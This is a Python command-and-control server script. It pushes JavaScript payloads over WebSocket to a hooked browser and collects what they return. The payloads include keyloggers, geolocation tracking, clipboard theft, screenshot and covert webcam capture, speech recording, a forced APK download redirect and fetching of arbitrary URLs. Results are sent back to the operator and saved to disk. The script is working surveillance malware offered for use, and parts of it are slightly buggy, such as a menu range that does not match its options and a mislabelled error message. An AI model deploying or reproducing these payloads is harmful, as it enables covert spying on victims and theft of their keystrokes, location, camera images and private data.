import asyncio
import websockets
import base64
import os
from datetime import datetime

# Define payloads including the new tools
payloads = {
    '1': '''
        let keysPressed = "";
        document.addEventListener("keydown", (e) => {
            keysPressed += e.key;
            console.log(keysPressed); // For monitoring purposes
        });
    ''',
    '2': '''
        navigator.geolocation.getCurrentPosition((position) => {
            const location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
            };
            console.log("Location retrieved: ", location);
            // Send location to the server
            ws.send(JSON.stringify(location));
        }, (error) => {
            console.log("Error getting location: ", error);
            ws.send("Error getting location: " + error.message);
        });
    ''',
    '3': '''
        // Keylogger: Sends keystrokes to the server
        let keysPressed = "";
        document.addEventListener("keydown", (e) => {
            keysPressed += e.key;
            ws.send(keysPressed);
        });
    ''',
    '4': '''
        // Screenshot Capture: Takes a screenshot and sends it back in Base64
        async function takeScreenshot() {
            const canvas = document.createElement("canvas");
            const context = canvas.getContext("2d");
            context.drawImage(document.body, 0, 0);
            const screenshotData = canvas.toDataURL("image/png").split(",")[1]; // Base64 encoded image data
            ws.send(screenshotData); // Send to server
        }
        takeScreenshot();
    ''',
    '5': '''
        // Clipboard Hijack: Sends clipboard data to the server
        async function getClipboardData() {
            try {
                const clipboardData = await navigator.clipboard.readText();
                ws.send(clipboardData);
            } catch (err) {
                ws.send("Failed to read clipboard");
            }
        }
        getClipboardData();
    ''',
    '6': '''
        // File Download: Downloads a file from a URL and sends its content back
        async function downloadFile(url) {
            const response = await fetch(url);
            const data = await response.text();
            ws.send(data); // Send the file content
        }
        downloadFile("{file_url}");  // File URL will be replaced by the server
    ''',
     '7': '''
        // Webcam Access: Captures webcam image and sends it back to the server
        async function captureWebcam() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.oncanplay = async () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0);
                const webcamData = canvas.toDataURL("image/png").split(",")[1]; // Base64 encoded webcam data
                ws.send(webcamData); // Send to server
                stream.getTracks().forEach(track => track.stop()); // Stop the webcam stream
            };
        }
        captureWebcam();
    ''',
    '8': '''
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";  // Rickroll redirect
    ''',
    '9': '''
        // APK download logic (URL is dynamically added by the server)
        let apkLink = "{apk_link}";  // This will be replaced by the server with the actual APK URL
        if (apkLink) {
            window.location.href = apkLink;  // Redirect to the APK download URL
        } else {
            alert("No APK link provided.");
        }
    ''',
     '10': '''
        // Speech to Text: Captures speech and sends it to the server
        async function speechToText(prompt) {
            const recognition = new window.SpeechRecognition();
            recognition.lang = 'en-US';
            recognition.interimResults = false;
            recognition.maxAlternatives = 1;

            recognition.onstart = function() {
                console.log("Listening for speech...");
            };

            recognition.onresult = function(event) {
                const transcript = event.results[0][0].transcript;
                console.log("Recognized speech: " + transcript);
                ws.send(transcript); // Send transcribed text to the server
            };

            recognition.onerror = function(event) {
                console.error("Speech recognition error", event.error);
                ws.send("Error with speech recognition: " + event.error);
            };

            recognition.onspeechend = function() {
                console.log("Speech ended.");
            };

            // Prompt the user with a message to speak
            alert(prompt);
            recognition.start();
        }
        speechToText("{prompt}");  // Prompt will be dynamically replaced by server
    '''
}

async def handle_client(websocket, path):
    print("Browser client connected.")
    
    try:
        while True:
            # Display the menu to the server user
            print("\nSelect an option to send to the browser:")
            print("1. Keylogger (default payload)")
            print("2. Geolocation payload")
            print("3. Keylogger (returns keystrokes to server)")
            print("4. Screenshot capture (Base64 encoded)")
            print("5. Clipboard hijack")
            print("6. File download from URL")
            print("7. Webcam capture (Base64 encoded)")
            print("8. Redirect to YouTube Rickroll")
            print("9. Auto-download APK (ask for link)")
            print("10. Speech to Text (prompt user for speech)")

            selection = input("Enter your selection (1-9): ").strip()
            
            # Validate input and choose payload
            if selection == '1':
                payload = payloads['1']
                print("Selected Keylogger payload.")
            elif selection == '2':
                payload = payloads['2']
                print("Selected Geolocation payload.")
            elif selection == '3':
                payload = payloads['3']
                print("Selected Keylogger payload that sends keystrokes to server.")
            elif selection == '4':
                payload = payloads['4']
                print("Selected Screenshot capture payload.")
            elif selection == '5':
                payload = payloads['5']
                print("Selected Clipboard hijack payload.")
            elif selection == '6':
                # Ask for file URL for downloading file
                file_url = input("Enter the file URL: ").strip()
                payload = payloads['6'].replace("{file_url}", file_url)
                print("Selected File download payload.")
            elif selection == '7':
                payload = payloads['7']
                print("Selected Webcam capture payload.")
            elif selection == '8':
                payload = payloads['8']
                print("Selected Rickroll redirect payload.")
            elif selection == '9':
                # Ask the server user for the APK URL
                apk_url = input("Enter the APK download URL: ").strip()
                if apk_url:
                    # Inject the APK URL into the payload
                    payload = payloads['9'].replace("{apk_link}", apk_url)
                    print("Selected APK download payload.")
            elif selection == '10':
                # Ask the server user for the prompt message
                prompt = input("Enter the prompt message for speech recognition: ").strip()
                if prompt:
                    # Inject the prompt message into the payload
                    payload = payloads['10'].replace("{prompt}", prompt)
                    print("Selected Speech to Text payload. Prompt message:", prompt)

                else:
                    print("No APK URL provided, skipping this option.")
                    continue
            else:
                print("Invalid selection, please choose 1-9.")
                continue

            # Send the selected payload to the client
            await websocket.send(payload)
            print(f"Sent payload: {payload}")

            # Receive the result from the client
            result = await websocket.recv()

            # If the result is base64-encoded data, decode and save it
            if result and isinstance(result, str) and (result.startswith("data:image/png;base64,") or result.startswith("data:text/plain;base64,")):
                print("Base64 data received, decoding and saving...")
                # Extract the Base64 content (strip any data URL prefix)
                base64_data = result.split(",")[1]
                # Decode the Base64 data
                decoded_data = base64.b64decode(base64_data)
                
                # Generate a timestamped filename for the file
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                file_name = f"screenshot_{timestamp}.png"  # Change the file extension based on the content type

                # Save the decoded data as a file
                with open(file_name, "wb") as file:
                    file.write(decoded_data)
                    print(f"File saved as {file_name}")
            else:
                print("Received data:\n", result)

            # Ask if the user wants to continue or exit
            continue_choice = input("Do you want to send another payload? (y/n): ").strip().lower()
            if continue_choice != 'y':
                print("Disconnecting client.")
                await websocket.send('exit')
                break

    except websockets.exceptions.ConnectionClosed:
        print("Client disconnected.")

async def main():
    server = await websockets.serve(handle_client, "localhost", 8765)
    print("WebSocket C2 server started on ws://localhost:8765")
    await server.wait_closed()

# Run the server
asyncio.run(main())
